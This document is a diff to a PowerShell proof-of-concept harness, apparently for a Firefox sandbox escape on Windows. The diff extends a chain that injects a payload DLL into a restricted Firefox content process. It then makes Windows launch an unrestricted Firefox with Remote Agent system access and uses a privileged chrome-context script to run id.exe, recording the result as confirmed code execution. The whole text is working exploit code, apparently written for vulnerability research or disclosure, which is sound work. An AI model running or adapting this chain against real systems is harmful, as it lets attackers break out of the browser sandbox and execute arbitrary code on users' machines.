@@ -22,6 +22,7 @@ $SignedMsix = Join-Path $WorkRoot "firefox-276bad1-test-signed.msix"
 $Driver = Join-Path $BuildRoot "poc_driver.exe"
 $Payload = Join-Path $BuildRoot "renderer_payload.dll"
 $Launcher = Join-Path $BuildRoot "firefox.exe"
+$RemoteIdProbe = Join-Path $PSScriptRoot "Invoke-RemoteIdProof.ps1"
 $LoadablePayload = $null
 $VerdictPath = Join-Path $ArtifactRoot "verdict.json"
 $SummaryPath = Join-Path $ArtifactRoot "summary.md"
@@ -67,6 +68,16 @@ $Verdict = [ordered]@{
     background_task_registered = $false
     background_task_registration_hresult = $null
     background_proxy_process_observed = $false
+    remote_agent_port = 0
+    remote_agent_process_observed = $false
+    remote_agent_connected = $false
+    privileged_chrome_context_observed = $false
+    id_command_proof = $false
+    id_command_path = $null
+    id_command_child_pid = 0
+    id_command_exit_code = $null
+    id_command_output = $null
+    id_command_error = $null
 }
 
 function Write-JsonFile {
@@ -105,6 +116,16 @@ function Invoke-DriverJson {
 
 function Get-FirefoxProcesses {
     return @(Get-CimInstance Win32_Process -Filter "Name = 'firefox.exe' OR Name = 'firefox-real.exe'" -ErrorAction SilentlyContinue)
+}
+
+function Get-AvailableLoopbackPort {
+    $Listener = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Loopback, 0)
+    try {
+        $Listener.Start()
+        return ([Net.IPEndPoint]$Listener.LocalEndpoint).Port
+    } finally {
+        $Listener.Stop()
+    }
 }
 
 function Wait-FirefoxContentProcess {
@@ -179,7 +200,17 @@ function Write-Summary {
         "- Background access status: ``$($Result.background_access_status)``",
         "- Renderer registered package timer: ``$($Result.background_task_registered)``",
         "- Background registration HRESULT: ``$($Result.background_task_registration_hresult)``",
-        "- Background-task proxy process observed: ``$($Result.background_proxy_process_observed)``"
+        "- Background-task proxy process observed: ``$($Result.background_proxy_process_observed)``",
+        "- Escaped Firefox Remote Agent port: ``$($Result.remote_agent_port)``",
+        "- Verified Remote Agent process observed: ``$($Result.remote_agent_process_observed)``",
+        "- WebDriver BiDi connection established: ``$($Result.remote_agent_connected)``",
+        "- Privileged chrome context observed: ``$($Result.privileged_chrome_context_observed)``",
+        "- ``id`` executed through escaped Firefox: ``$($Result.id_command_proof)``",
+        "- ``id`` executable: ``$($Result.id_command_path)``",
+        "- ``id`` child PID: ``$($Result.id_command_child_pid)``",
+        "- ``id`` exit code: ``$($Result.id_command_exit_code)``",
+        "- ``id`` output: ``$($Result.id_command_output)``",
+        "- ``id`` proof error: ``$($Result.id_command_error)``"
     )
     $Lines | Set-Content -LiteralPath $SummaryPath -Encoding utf8NoBOM
 }
@@ -369,12 +400,15 @@ exit /b %errorlevel%
     }
 
     Write-JsonFile -Value (Get-FirefoxProcesses | Select-Object ProcessId, ParentProcessId, CommandLine) -Path (Join-Path $ArtifactRoot "processes-before.json")
-    $EscapedArguments = "-no-remote -new-instance -profile $EscapedProfile -headless about:blank"
-    $ShellExecuteArguments = "-no-remote -new-instance -profile $ShellExecuteProfile -headless about:blank"
-    $ShellDispatchArguments = "-no-remote -new-instance -profile $ShellDispatchProfile -headless about:blank"
-    $AppExecAliasArguments = "-no-remote -new-instance -profile $AppExecAliasProfile -headless about:blank"
+    $RemoteAgentPort = Get-AvailableLoopbackPort
+    $Verdict.remote_agent_port = $RemoteAgentPort
+    $RemoteAgentArguments = "--remote-debugging-port=$RemoteAgentPort --remote-allow-system-access"
+    $EscapedArguments = "-no-remote -new-instance -profile $EscapedProfile -headless $RemoteAgentArguments about:blank"
+    $ShellExecuteArguments = "-no-remote -new-instance -profile $ShellExecuteProfile -headless $RemoteAgentArguments about:blank"
+    $ShellDispatchArguments = "-no-remote -new-instance -profile $ShellDispatchProfile -headless $RemoteAgentArguments about:blank"
+    $AppExecAliasArguments = "-no-remote -new-instance -profile $AppExecAliasProfile -headless $RemoteAgentArguments about:blank"
     $BackgroundMarker = "winfire-$Nonce"
-    $BackgroundTaskName = "${BackgroundMarker}:-no-remote:-new-instance:-headless"
+    $BackgroundTaskName = "${BackgroundMarker}:-no-remote:-new-instance:-headless:-remote-debugging-port=$RemoteAgentPort:-remote-allow-system-access"
     $Injection = Invoke-DriverJson -Arguments @(
         "inject",
         "--pid", $ContentProcess.ProcessId.ToString(),
@@ -532,9 +566,65 @@ exit /b %errorlevel%
             )
         }
     }
+    $RemoteAgentProcess = Get-FirefoxProcesses | Where-Object {
+        $_.Name -eq "firefox-real.exe" -and
+        $_.CommandLine -notmatch "-contentproc" -and
+        $_.CommandLine -like "*$Nonce*" -and
+        $_.CommandLine -like "*remote-debugging-port=$RemoteAgentPort*" -and
+        $_.CommandLine -like "*remote-allow-system-access*"
+    } | Select-Object -First 1
+    if ($null -ne $RemoteAgentProcess) {
+        $RemoteAgentSnapshot = Invoke-DriverJson -Arguments @(
+            "inspect", "--pid", $RemoteAgentProcess.ProcessId.ToString()
+        ) -EvidenceName "remote-agent-firefox.json"
+        $Verdict.remote_agent_process_observed = [bool](
+            $RemoteAgentSnapshot.pid -eq $RemoteAgentProcess.ProcessId -and
+            $RemoteAgentSnapshot.command_line -like "*$Nonce*" -and
+            $RemoteAgentSnapshot.command_line -like "*remote-debugging-port=$RemoteAgentPort*" -and
+            $RemoteAgentSnapshot.command_line -like "*remote-allow-system-access*" -and
+            $RemoteAgentSnapshot.integrity_rid -ge 8192 -and
+            -not $RemoteAgentSnapshot.is_restricted -and
+            $RemoteAgentSnapshot.package_family -eq $InstalledPackage.PackageFamilyName
+        )
+        if ($Verdict.remote_agent_process_observed) {
+            try {
+                $RemoteIdText = @(& $RemoteIdProbe `
+                    -Port $RemoteAgentPort `
+                    -Nonce $Nonce `
+                    -EvidencePath (Join-Path $ArtifactRoot "remote-id-proof.json") 2>&1) -join "`n"
+                $RemoteId = $RemoteIdText | ConvertFrom-Json -Depth 20
+                $Verdict.remote_agent_connected = $true
+                $Verdict.privileged_chrome_context_observed = $true
+                $Verdict.id_command_path = [string]$RemoteId.command
+                $Verdict.id_command_child_pid = [int]$RemoteId.childPid
+                $Verdict.id_command_exit_code = [int]$RemoteId.exitCode
+                $Verdict.id_command_output = ([string]$RemoteId.output).Trim()
+                $Verdict.id_command_proof = [bool](
+                    [string]$RemoteId.nonce -eq $Nonce -and
+                    [int]$RemoteId.firefoxPid -eq $RemoteAgentProcess.ProcessId -and
+                    [IO.Path]::GetFileName([string]$RemoteId.command) -eq "id.exe" -and
+                    [int]$RemoteId.childPid -gt 0 -and
+                    [int]$RemoteId.exitCode -eq 0 -and
+                    [string]$RemoteId.output -match "(?m)^uid=.*\bgid="
+                )
+                if (-not $Verdict.id_command_proof) {
+                    $Verdict.id_command_error = "Remote execution returned, but its PID, nonce, executable, exit status, or id-format output did not validate."
+                }
+            } catch {
+                $Verdict.id_command_error = $_.Exception.Message
+                $_ | Out-String | Set-Content -LiteralPath (Join-Path $ArtifactRoot "remote-id-error.txt") -Encoding utf8NoBOM
+            }
+        }
+    } else {
+        $Verdict.id_command_error = "No marked, unrestricted Firefox process exposed the requested Remote Agent endpoint."
+    }
+
     Write-JsonFile -Value (Get-FirefoxProcesses | Select-Object ProcessId, ParentProcessId, CommandLine) -Path (Join-Path $ArtifactRoot "processes-after.json")
 
-    if ($Verdict.app_exec_alias_process_observed) {
+    if ($Verdict.id_command_proof) {
+        $Verdict.status = "CONFIRMED_ID_CODE_EXECUTION"
+        $Verdict.reason = "A restricted Firefox content process caused Windows to launch a marked, unrestricted packaged Firefox process with Remote Agent system access. A privileged chrome-context script in that exact process launched id.exe and captured its successful output."
+    } elseif ($Verdict.app_exec_alias_process_observed) {
         $Verdict.status = "CONFIRMED_APP_EXEC_ALIAS"
         $Verdict.reason = "A restricted untrusted-integrity Firefox content process invoked the package AppExecLink with controlled arguments. Windows launched a non-restricted packaged Firefox process carrying the unique profile marker."
     } elseif ($Verdict.notification_activation_process_observed) {
